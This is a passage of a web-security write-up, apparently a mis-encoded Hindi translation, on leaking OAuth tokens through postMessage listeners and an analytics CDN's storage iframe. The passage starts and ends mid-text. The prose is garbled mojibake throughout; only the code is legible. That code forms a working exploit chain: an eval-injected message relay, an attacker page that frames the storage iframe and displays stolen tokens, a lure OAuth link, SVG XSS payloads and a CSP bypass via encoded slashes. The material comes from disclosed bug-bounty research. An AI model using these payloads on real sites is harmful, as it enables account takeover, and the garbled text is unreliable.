рдореИрдВрдиреЗ рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛ рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╢реБрд░реВ рдХрд┐рдпрд╛ рд╣реИ рдЬреЛ рдпрд╣ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ рдХрд┐ рдХреНрдпрд╛ рд▓рд┐рдВрдХ рдЦреЛрд▓рд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдореИрдВ рдЬрд┐рд╕ iframe рдХреЛ рдкрд╣реБрдВрдЪрдирд╛ рдЪрд╛рд╣рддрд╛ рдерд╛, рд╡рд╣рд╛рдВ рд╣реИ, рддрд╛рдХрд┐ рдореИрдВ рдЕрдкрдиреЗ iframe рд╕реЗ рдореБрдЦреНрдп рд╡рд┐рдВрдбреЛ рдореЗрдВ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЪрд▓рд╛ рд╕рдХреВрдВред рдлрд┐рд░ рдореИрдВрдиреЗ рдПрдХ postMessage-listener рдЬреЛрдбрд╝рд╛ рд╣реИ рдЬреЛ рд╕рдВрджреЗрд╢ рдХреЛ рдореЗрд░реЗ рдЦрддрд░рдирд╛рдХ рд╡рд┐рдВрдбреЛ рдореЗрдВ рд╡рд╛рдкрд╕ рднреЗрдЬрддрд╛ рд╣реИ:

```javascript
x = setInterval(function() {
if(b && b.frames[1]) {
b.frames[1].eval(
'onmessage=function(e) { top.opener.postMessage(e.data, "*") };' +
'top.postMessage({type:'initConfig'},"*")'
)
clearInterval(x)
}
}, 500);
```

4. рдЦрддрд░рдирд╛рдХ рдкреЗрдЬ рдЬрд┐рд╕рдореЗрдВ iframe рд▓реЛрдб рд╣реЛ рд░рд╣рд╛ рдерд╛, рдлрд┐рд░ рдореЗрд░реЗ рджреНрд╡рд╛рд░рд╛ рдореБрдЦреНрдп рд╡рд┐рдВрдбреЛ рдХреЗ iframe рдореЗрдВ рднреЗрдЬреЗ рдЧрдП рд╕рдВрджреЗрд╢ рдХреЛ рд╕реБрди рд╕рдХрддрд╛ рд╣реИ:

```html
<script>
window.addEventListener('message', function (e) {
if (e.data) {
document.getElementById('leak').innerText = 'рд╣рдордиреЗ рдЯреЛрдХрди рдЪреБрд░рд╛ рд▓рд┐рдпрд╛ рд╣реИ: ' + JSON.stringify(e.data);
}
});
</script>
```

## рдЧреИрдЬреЗрдЯ 3: URL рдЖрдЙрдЯ-рдСрдл-рдмрд╛рдЙрдВрдбреНрд╕ рд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП API рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛

![](https://labs.detectify.com/wp-content/uploads/2022/06/Gadget-3--1024x582.png)

&#x20;

рдпрд╣ рдЧреИрдЬреЗрдЯ рд╕рдмрд╕реЗ рдордЬреЗрджрд╛рд░ рд╕рд╛рдмрд┐рдд рд╣реБрдЖред рдХрд┐рд╕реА рдХреЛ рдХрд╣реАрдВ рднреЗрдЬрдиреЗ рдФрд░ рдлрд┐рд░ рдПрдХ рдЕрд▓рдЧ рд╕реНрдерд╛рди рд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рдЙрдард╛рдиреЗ рдореЗрдВ рдХреБрдЫ рд╕рдВрддреЛрд╖рдЬрдирдХ рд╣реИред

## **рдЧреИрдЬреЗрдЯ 3: рдЙрджрд╛рд╣рд░рдг 1, рд╕реНрдЯреЛрд░реЗрдЬ-рдЖрдЗрдлреНрд░реЗрдо рдмрд┐рдирд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдЬрд╛рдВрдЪ рдХреЗ**

рдкрд╣рд▓рд╛ рдЙрджрд╛рд╣рд░рдг рдЯреНрд░реИрдХрд┐рдВрдЧ-рдбреЗрдЯрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрд╛рд╣рд░реА рд╕реЗрд╡рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рдерд╛ред рдЗрд╕ рд╕реЗрд╡рд╛ рдиреЗ рдПрдХ "рд╕реНрдЯреЛрд░реЗрдЬ рдЖрдЗрдлреНрд░реЗрдо" рдЬреЛрдбрд╝рд╛ рдерд╛:
```html
<iframe
id="tracking"
name="tracking"
src="https://cdn.customer1234.analytics.example.com/storage.html">
</iframe>
```
рдореБрдЦреНрдп рд╡рд┐рдВрдбреЛ postMessage рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕ рдЖрдЗрдлреНрд░реЗрдо рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░реЗрдЧреА рдФрд░ рдЯреНрд░реИрдХрд┐рдВрдЧ рдбреЗрдЯрд╛ рдХреЛ рднреЗрдЬреЗрдЧреА рдЬреЛ `storage.html` рдХреЗ рдореВрд▓ рд╕реНрдерд╛рди рдХреЗ localStorage рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЬрд╛рдПрдЧрд╛:
```javascript
tracking.postMessage('{"type": "put", "key": "key-to-save", "value": "saved-data"}', '*');
```
рдореБрдЦреНрдп рд╡рд┐рдВрдбреЛ рднреА рдЗрд╕ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреА рд╣реИ:
```javascript
tracking.postMessage('{"type": "get", "key": "key-to-save"}', '*');
```
![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example1.png)

рдЬрдм iframe рдХреЛ рдкреНрд░рд╛рд░рдВрднрд┐рдХрд░рдг рдкрд░ рд▓реЛрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рддреЛ `location.href` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЕрдВрддрд┐рдо рд╕реНрдерд╛рди рдХреЗ рд▓рд┐рдП рдПрдХ рдХреБрдВрдЬреА рд╕рд╣реЗрдЬреА рдЧрдИ рдереА:
```javascript
tracking.postMessage('{"type": "put", "key": "last-url", "value": "https://example.com/?code=test#access_token=test"}', '*');
```
рдпрджрд┐ рдЖрдк рдЗрд╕ рдореВрд▓ рд╕реЗ рдХрд┐рд╕реА рднреА рддрд░реАрдХреЗ рд╕реЗ рдмрд╛рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рдЖрдкрдХреЛ рд╕рд╛рдордЧреНрд░реА рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░реЗрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЗрд╕ рд╕рдВрдЧреНрд░рд╣ рд╕реЗ `location.href` рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╕реЗрд╡рд╛ рдХреЗ рд▓рд┐рдП postMessage-рд╕реБрдирдиреЗ рд╡рд╛рд▓реЗ рдХреЗ рдкрд╛рд╕ рдореВрд▓реЛрдВ рдХреА рдПрдХ рдмреНрд▓реЙрдХ-рд╕реВрдЪреА рдФрд░ рдПрдХ рдЕрдиреБрдорддрд┐-рд╕реВрдЪреА рдереАред рдРрд╕рд╛ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЛ рд╡рд┐рд╢реЗрд╖ рдореВрд▓реЛрдВ рдХреЛ рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдпрд╛ рдирд┐рд░рд╕реНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реНрд▓реЗрд╖рдг-рд╕реЗрд╡рд╛ рджреНрд╡рд╛рд░рд╛ рдЕрдиреБрдорддрд┐ рджреА рдЧрдИ рдереА:
```javascript
var blockList = [];
var allowList = [];
var syncListeners = [];

window.addEventListener('message', function(e) {
// If there's a blockList, check if origin is there and if so, deny
if (blockList && blockList.indexOf(e.origin) !== -1) {
return;
}
// If there's an allowList, check if origin is there, else deny
if (allowList && allowList.indexOf(e.origin) == -1) {
return;
}
// Only parent can talk to it
if (e.source !== window.parent) {
return;
}
handleMessage(e);
});

function handleMessage(e) {
if (data.type === 'sync') {
syncListeners.push({source: e.source, origin: e.origin})
} else {
...
}

window.addEventListener('storage', function(e) {
for(var i = 0; i < syncListeners.length; i++) {
syncListeners[i].source.postMessage(JSON.stringify({type: 'sync', key: e.key, value: e.newValue}), syncListeners[i].origin);
}
}
```
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ `allowList` рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдПрдХ рдорд╛рдиреНрдп рдореВрд▓ рдерд╛, рддреЛ рдЖрдк рд╕рд┐рдВрдХ рдХреЗ рд▓рд┐рдП рднреА рдкреВрдЫ рд╕рдХрддреЗ рдереЗ, рдЬрд┐рд╕рд╕реЗ рдЖрдкрдХреЛ рдЗрд╕ рд╡рд┐рдВрдбреЛ рдореЗрдВ localStorage рдореЗрдВ рдХрд┐рдП рдЧрдП рдХрд┐рд╕реА рднреА рдмрджрд▓рд╛рд╡ рдХреЛ рднреЗрдЬ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрдм рд╡реЗ рдХрд┐рдП рдЬрд╛рддреЗ рдереЗред

### рд╣рдорд▓рд╛

рдЗрд╕ рд╕реНрдЯреЛрд░реЗрдЬ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рд╡рд╛рд▓реА рд╡реЗрдмрд╕рд╛рдЗрдЯ рдкрд░ OAuth-рдбрд╛рдВрд╕ рдХреЗ рдЧреИрд░-рд╣реИрдкреНрдкреА рдкрде рдкрд░ рдХреЛрдИ allowList-рдореВрд▓ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдирд╣реАрдВ рдереЗ; **рдпрд╣ рдХрд┐рд╕реА рднреА рдореВрд▓ рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рдерд╛ рдпрджрд┐ рдореВрд▓ рд╡рд┐рдВрдбреЛ рдХрд╛ рдореВрд▓ рд╣реИ**:

1.  рдореИрдВрдиреЗ рдПрдХ рджреБрд╖реНрдЯ рдкреЗрдЬ рдмрдирд╛рдпрд╛ рдЬрд┐рд╕рдиреЗ рд╕реНрдЯреЛрд░реЗрдЬ рдХрдВрдЯреЗрдирд░ рдХрд╛ рдПрдХ iframe рдПрдореНрдмреЗрдб рдХрд┐рдпрд╛ рдФрд░ рдЬрдм рдЗрд╕ iframe рдХреЛ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдПрдХ onload рдЬреЛрдбрд╝рд╛ред

```html
<div id="leak"><iframe
id="i" name="i"
src="https://cdn.customer12345.analytics.example.com/storage.html"
onload="run()"></iframe></div>
```
2.  рдХреНрдпреЛрдВрдХрд┐ рджреБрд╖реНрдЯ рдкреЗрдЬ рдЕрдм iframe рдХрд╛ рдореВрд▓ рд╣реЛ рдЧрдпрд╛ рдерд╛, рдФрд░ `allowList` рдореЗрдВ рдХреЛрдИ рдореВрд▓ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдирд╣реАрдВ рдереЗ, рджреБрд╖реНрдЯ рдкреЗрдЬ рд╕реНрдЯреЛрд░реЗрдЬ рдХреЛ рд╕рдВрджреЗрд╢ рднреЗрдЬ рд╕рдХрддрд╛ рдерд╛ рддрд╛рдХрд┐ рд╕рдВрдЧреНрд░рд╣ рдХреЛ рд╕рдВрдЧреНрд░рд╣ рдХреЗ рд▓рд┐рдП рд╕рдВрджреЗрд╢ рднреЗрдЬреЗрдВред рдореИрдВ рджреБрд╖реНрдЯ рдкреЗрдЬ рдореЗрдВ рдПрдХ рд╕реБрдирдиреЗ рд╡рд╛рд▓реЗ рдХреЛ рднреА рдЬреЛрдбрд╝ рд╕рдХрддрд╛ рдерд╛ рдЬреЛ рд╕рдВрдЧреНрд░рд╣ рд╕реЗ рдХрд┐рд╕реА рднреА рд╕рд┐рдВрдХ-рдЕрдкрдбреЗрдЯ рдХреЗ рд▓рд┐рдП рд╕реБрди рд╕рдХрддрд╛ рдерд╛:

```html
<script>
function run() {
i.postMessage({type:'sync'}, '*')
}
window.addEventListener('message', function (e) {
if (e.data && e.data.type === 'sync') {
document.getElementById('leak').innerText = 'рд╣рдордиреЗ рдЯреЛрдХрди рдЪреБрд░рд╛ рд▓рд┐рдпрд╛ рд╣реИ: ' + JSON.stringify(e.data);
}
});
</script>
```
3.  рджреБрд╖реНрдЯ рдкреЗрдЬ рдореЗрдВ рдкреАрдбрд╝рд┐рдд рдХреЗ рд▓рд┐рдП рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рд▓рд┐рдВрдХ рднреА рд╣реЛрдЧрд╛:

```html
<a href="https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?..."
target="_blank">рдпрд╣рд╛рдВ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдЯреЛрдХрди рдХреЛ рд╣рд┐рдЬреИрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП</a>';
```
4.  рдкреАрдбрд╝рд┐рдд рд╡реНрдпрдХреНрддрд┐ рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдЧрд╛, OAuth-рдбрд╛рдВрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬрд╛рдПрдЧрд╛, рдФрд░ рдЯреНрд░реИрдХрд┐рдВрдЧ-рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдФрд░ рд╕реНрдЯреЛрд░реЗрдЬ-iframe рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рдЧреИрд░-рд╣реИрдкреНрдкреА рдкрде рдкрд░ рд▓рдВрдмрд┐рдд рд╣реЛ рдЬрд╛рдПрдЧрд╛ред рд╕реНрдЯреЛрд░реЗрдЬ iframe рдХреЛ `last-url` рдХрд╛ рдЕрджреНрдпрддрди рдорд┐рд▓рддрд╛ рд╣реИред `window.storage`-рдЗрд╡реЗрдВрдЯ рджреБрд╖реНрдЯ рдкреЗрдЬ рдХреЗ iframe рдореЗрдВ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ localStorage рдЕрдкрдбреЗрдЯ рд╣реБрдЖ рдерд╛, рдФрд░ рджреБрд╖реНрдЯ рдкреЗрдЬ рдХреЛ рдЬреЛ рдЕрдм рд╕рдВрдЧреНрд░рд╣ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрди рд╣реЛрдиреЗ рдкрд░ рдЕрджреНрдпрддрди рдкреНрд░рд╛рдкреНрдд рдХрд░ рд░рд╣рд╛ рдерд╛, рд╡рд╣ рд╡реНрдпрдХреНрддрд┐ рдХреЗ рд╡рд░реНрддрдорд╛рди URL рдХреЗ рд╕рд╛рде рдПрдХ postMessage рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдЧрд╛:

<figure><img src="https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example2.png" alt=""><figcaption></figcaption></figure>

## **рдЧреИрдЬреЗрдЯ 3: рдЙрджрд╛рд╣рд░рдг 2, CDN рдореЗрдВ рдЧреНрд░рд╛рд╣рдХ рдорд┐рдХреНрд╕-рдЕрдк - рдореВрд▓ рдЬрд╛рдВрдЪ рдХреЗ рдмрд┐рдирд╛ рд╕реНрдЯреЛрд░реЗрдЬ-SVG рдЦреБрдж рдмрдирд╛рдПрдВ**

рдЬрдм рдореИрдВ рд╕рд╣реА рдореВрд▓реЛрдВ рдХреЛ рд╕рдВрд░рдЪрд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реА рд╕реНрдЯреЛрд░реЗрдЬ-iframe рдХреЗ рд▓рд┐рдП рд╡реЗрдмрд╕рд╛рдЗрдЯреЛрдВ рдХреЗ рд▓рд┐рдП рднреА рдпреВрдЖрд░рдПрд▓ рд▓реАрдХ рдХрд░рдиреЗ рдХрд╛ рддрд░реАрдХрд╛ рдвреВрдВрдврд╝рдирд╛ рд╢реБрд░реВ рдХрд┐рдпрд╛, рддреЛ рдореБрдЭреЗ рдпрд╣ рднреА рджрд┐рдЦрд╛рдИ рджрд┐рдпрд╛ рдХрд┐ рдпрд╣ CDN рд╕реЗрд╡рд╛ рднреА рд╕реЗрд╡рд╛ рдХреЗ рдЧреНрд░рд╛рд╣рдХреЛрдВ рджреНрд╡рд╛рд░рд╛ рдЕрдкрд▓реЛрдб рдХреА рдЧрдИ рдЫрд╡рд┐рдпреЛрдВ рдХреЛ рд╕рдореЗрдд рд░рдЦрддрд╛ рд╣реИ:
```
https://cdn.analytics.example.com/img/customer42326/event-image.png
https://cdn.analytics.example.com/img/customer21131/test.png
```
рдореИрдВрдиреЗ рднреА рдзреНрдпрд╛рди рджрд┐рдпрд╛ рдХрд┐ рдЗрд╕ CDN рдкрд░ `Content-type: image/svg+xml` рдХреЗ рд░реВрдк рдореЗрдВ рдЗрдирд▓рд╛рдЗрди рд╕реЗрд╡ рдХрд┐рдП рдЧрдП SVG рдлрд╝рд╛рдЗрд▓реЗрдВ рдереАрдВ:
```
https://cdn.analytics.example.com/img/customer54353/icon-register.svg
```
рдореИрдВрдиреЗ рд╕реЗрд╡рд╛ рдкрд░ рдкрд░реАрдХреНрд╖рдг рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдкрдВрдЬреАрдХрд░рдг рдХрд┐рдпрд╛ рдФрд░ рдЕрдкрдиреА рд╕рдВрдкрддреНрддрд┐ рдХреЛ рдЕрдкрд▓реЛрдб рдХрд┐рдпрд╛, рдЬреЛ рд╕реАрдбреАрдПрди рдкрд░ рднреА рджрд┐рдЦрд╛рдИ рджреАред
```
https://cdn.analytics.example.com/img/customer94342/tiger.svg
```
рджрд┐рд▓рдЪрд╕реНрдк рдмрд╛рдд рдпрд╣ рдереА рдХрд┐, рдЕрдЧрд░ рдЖрдк рдЙрдкрднреЛрдХреНрддрд╛-рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╕рдмрдбреЛрдореЗрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реАрдбреАрдПрди рдХреЗ рд▓рд┐рдП рдЗрдореЗрдЬ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рдереЗ, рддреЛ рдЗрдореЗрдЬ рдлрд┐рд░ рднреА рд╕рд░реНрд╡ рдХреА рдЬрд╛рддреА рдереАред рдпрд╣ URL рдХрд╛рдо рдХрд░рддрд╛ рдерд╛:
```
https://cdn.customer12345.analytics.example.com/img/customer94342/tiger.svg
```
![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example4.png)

рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЧреНрд░рд╛рд╣рдХ рдЬрд┐рд╕рдХрд╛ рдЖрдИрдбреА #94342 рд╣реИ, рд╡рд╣ рдЧреНрд░рд╛рд╣рдХ #12345 рдХреЗ рд╕реНрдЯреЛрд░реЗрдЬ рдореЗрдВ SVG-рдлрд╝рд╛рдЗрд▓реНрд╕ рдХреЛ рд░реЗрдВрдбрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдореИрдВрдиреЗ рдПрдХ рд╕рд░рд▓ XSS-рдкреЗрд▓реЛрдб рдХреЗ рд╕рд╛рде рдПрдХ SVG-рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХреА:

`https://cdn.customer12345.analytics.example.com/img/customer94342/test.svg`
```html
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg id="svg2" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 500 500" width="100%" height="100%" version="1.1">
<script xlink:href="data:,alert(document.domain)"></script>
</svg>
```
![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example3.png)

рдЕрдЪреНрдЫрд╛ рдирд╣реАрдВред CDN рдиреЗ `img/` рдХреЗ рддрд╣рдд рд╕рдм рдХреБрдЫ рдХреЗ рд▓рд┐рдП `Content-Security-Policy: default-src 'self'` рд╣реЗрдбрд░ рдЬреЛрдбрд╝ рджрд┐рдпрд╛ред рдЖрдк рд╕рд░реНрд╡рд░ рд╣реЗрдбрд░ рдореЗрдВ S3 рдХрд╛ рдЙрд▓реНрд▓реЗрдЦ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ - рдЬреЛ рдмрддрд╛ рд░рд╣рд╛ рд╣реИ рдХрд┐ рд╕рд╛рдордЧреНрд░реА рдХреЛ S3-рдмрдХреЗрдЯ рдкрд░ рдЕрдкрд▓реЛрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛:

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example5.png)

S3 рдХреЗ рд╕рд╛рде рдПрдХ рджрд┐рд▓рдЪрд╕реНрдк рд╡рд┐рд╢реЗрд╖рддрд╛ рд╣реИ рдХрд┐ S3 рдореЗрдВ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдПрдВ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ S3 рдореЗрдВ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИрдВ; рдХреБрдВрдЬреА рдХреЗ рдкрд╣рд▓реЗ рдорд╛рд░реНрдЧ рдХреЛ "рдкреНрд░рд┐рдлрд┐рдХреНрд╕" рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ S3 рдХреЛ рдлрд░реНрдХ рдирд╣реАрдВ рдкрдбрд╝рддрд╛ рд╣реИ рдХрд┐ `/` url-encode рдХрд┐рдП рдЧрдП рд╣реИрдВ рдпрд╛ рдирд╣реАрдВ, рдпрджрд┐ рдЖрдк URL рдореЗрдВ рд╣рд░ рд╕реНрд▓реИрд╢ рдХреЛ url-encode рдХрд░рддреЗ рд╣реИрдВ рддреЛ рд╡рд╣ рдлрд┐рд░ рднреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рд╕реЗрд╡ рдХрд░реЗрдЧрд╛ред рдпрджрд┐ рдореИрдВ URL рдореЗрдВ `img/` рдХреЛ `img%2f` рдореЗрдВ рдмрджрд▓рддрд╛ рд╣реВрдБ рддреЛ рднреА рдЫрд╡рд┐ рд╣рд▓ рд╣реЛ рдЬрд╛рдПрдЧреАред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЙрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ CSP-рд╣реЗрдбрд░ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдФрд░ XSS рдЯреНрд░рд┐рдЧрд░ рд╣реБрдЖ:

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example6.png)

рдлрд┐рд░ рдореИрдВрдиреЗ рдПрдХ SVG рдЕрдкрд▓реЛрдб рдХрд┐рдпрд╛ рдЬреЛ рдирд┐рдпрдорд┐рдд `storage.html` рдХреА рддрд░рд╣реА рдПрдХ рд╕рдВрдЧреНрд░рд╣-рд╣реИрдВрдбрд▓рд░ рдФрд░ postMessage-рд╕реБрдирдиреЗ рд╡рд╛рд▓реЗ рдХреЛ рдмрдирд╛рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЦрд╛рд▓реА `allowList`ред рдЗрд╕рд╕реЗ рдореБрдЭреЗ рдЙрдиреА рд╕рдорд╛рди рдкреНрд░рдХрд╛рд░ рдХреЗ рд╣рдорд▓реЗ рдХреЛ рднреА рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓реА рдЬреЛ рд╕рдВрдЧреНрд░рд╣ рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓реА рдореВрд▓ рд╕реНрд░реЛрддреЛрдВ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░ рдЪреБрдХреЗ рдереЗред

рдореИрдВрдиреЗ рдПрдХ рдРрд╕рд╛ SVG рдЕрдкрд▓реЛрдб рдХрд┐рдпрд╛ рдЬреЛ рдЗрд╕ рддрд░рд╣ рджрд┐рдЦрддрд╛ рд╣реИ:
```html
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg id="svg2" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 5 5" width="100%" height="100%" version="1.1">
<script xlink:href="data:application/javascript;base64,dmFyIGJsb2NrTGlzdCA9IFtdOwp2YXIgYWxsb3dMaXN0ID0gW107Ci4uLg=="></script>
</svg>
```
рдореИрдВ рдлрд┐рд░ рдЙрд╕реА рддрд░реАрдХреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реВрдБ рдЬреИрд╕реЗ рдЙрджрд╛рд╣рд░рдг #1 рдореЗрдВ, рд▓реЗрдХрд┐рди `storage.html` рдХреЛ рдЗрдлреНрд░реЗрдо рдХрд░рдиреЗ рдХреА рдмрдЬрд╛рдп рдореИрдВ рдХреЗрд╡рд▓ рдпреВрдЖрд░рдПрд▓-рдПрдирдХреЛрдбреЗрдб рд╕реНрд▓реИрд╢ рдХреЗ рд╕рд╛рде SVG рдХреЛ рдЗрдлреНрд░реЗрдо рдХрд░ рд╕рдХрддрд╛ рд╣реВрдБ:
```html
<div id="leak"><iframe
id="i" name="i"
src="https://cdn.customer12345.analytics.example.com/img%2fcustomer94342/listener.svg"
onload="run()"></iframe></div>
```
рдХреНрдпреЛрдВрдХрд┐ рдХреЛрдИ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдЗрд╕реЗ рд╕реНрд╡рдпрдВ рдкреИрдЪ рдирд╣реАрдВ рдХрд░ рд╕рдХреЗрдЧреА, рдЗрд╕рд▓рд┐рдП рдореИрдВрдиреЗ рдЗрд╕реЗ CDN рдХреЗ рд▓рд┐рдП рдЬрд┐рдореНрдореЗрджрд╛рд░ рдПрдирд╛рд▓рд┐рдЯрд┐рдХреНрд╕ рдкреНрд░рджрд╛рддрд╛ рдХреЛ рд░рд┐рдкреЛрд░реНрдЯ рднреЗрдЬ рджреА:

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget3-example7.png)

рддреАрд╕рд░реЗ рдкрдХреНрд╖ рдХреА рдЧрд▓рддрд┐рдпреЛрдВ рдкрд░ рджреЗрдЦрдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдкреВрд░реА рд╡рд┐рдЪрд╛рд░рдзрд╛рд░рд╛ рдЗрд╕ рдмрд╛рдд рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдереА рдХрд┐ рдЯреЛрдХрди рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рдХрдИ рддрд░реАрдХреЗ рд╣реИрдВ рдФрд░ рдХреНрдпреЛрдВрдХрд┐ рддреАрд╕рд░реЗ рдкрдХреНрд╖ рдХреЗ рдкрд╛рд╕ рдПрдХ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдерд╛, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдПрдХ рд╣реА рдкреНрд░рдХрд╛рд░ рдХреА рдмрдЧ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрд▓рдЧ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рдерд╛, рдЕрдВрддрд░ рдпрд╣ рдерд╛ рдХрд┐ рдкреНрд░рднрд╛рд╡ рд╕рднреА рдПрдирд╛рд▓рд┐рдЯрд┐рдХреНрд╕ рд╕реЗрд╡рд╛ рдХреЗ рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреЗ рд▓рд┐рдП рдерд╛ред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рддреАрд╕рд░реЗ рдкрдХреНрд╖ рдХреЗ рдЧреНрд░рд╛рд╣рдХ рдХреЗ рдкрд╛рд╕ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЙрдкрдХрд░рдг рдХреЛ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдереА рддрд╛рдХрд┐ рдпрд╣ рдбреЗрдЯрд╛ рдХреЛ рдЕрдкрд░рд╛рдзреА рдХреЛ рдирд╣реАрдВ рд▓реАрдХ рдХрд░реЗред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдХреНрдпреЛрдВрдХрд┐ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рдЕрднреА рднреА рддреАрд╕рд░реЗ рдкрдХреНрд╖ рдХреЛ рднреЗрдЬрд╛ рдЧрдпрд╛ рдерд╛, рдЗрд╕рд▓рд┐рдП рджреЗрдЦрдирд╛ рдерд╛ рдХрд┐ рдХреНрдпрд╛ рдХреЛрдИ рддрд░реАрдХрд╛ рд╣реИ 